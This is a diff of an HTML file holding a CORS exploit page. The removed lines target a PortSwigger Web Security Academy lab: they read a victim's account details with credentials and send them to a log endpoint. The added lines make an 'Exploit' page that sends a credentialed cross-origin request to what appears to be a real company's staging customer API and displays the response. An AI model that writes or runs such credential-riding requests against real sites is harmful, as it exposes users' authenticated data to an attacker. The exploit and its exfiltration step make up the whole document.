@@ -1,16 +1,27 @@
+<!DOCTYPE html>
 <html>
-    <body>
+<head>
+    <title>CORS</title>
+</head>
+<body>
+    <center>
+        <h2>CORS Exploit HTML</h2>
+        <textarea id="cors_test_area" rows="25" cols="80"></textarea><br>
+        <button type="button" onclick="cors()">Exploit</button>
+    </center>
 
-        <script>
-            var req = new XMLHttpRequest();
-            req.onload = reqListener;
-            req.open('get','https://0add00400369e19d8095a868003100a0.web-security-academy.net/accountDetails',true);
-            req.withCredentials = true;
-            req.send();
-
-            function reqListener() {
-                location='/log?key='+this.responseText;
+    <script>
+        function cors() {
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    document.getElementById("cors_test_area").innerHTML = this.responseText;
+                }
             };
-        </script>
-    </body>
+            xhttp.open("GET", "https://api.staging.my.zalora.net/v1/customers", true);
+            xhttp.withCredentials = true;
+            xhttp.send();
+        }
+    </script>
+</body>
 </html>
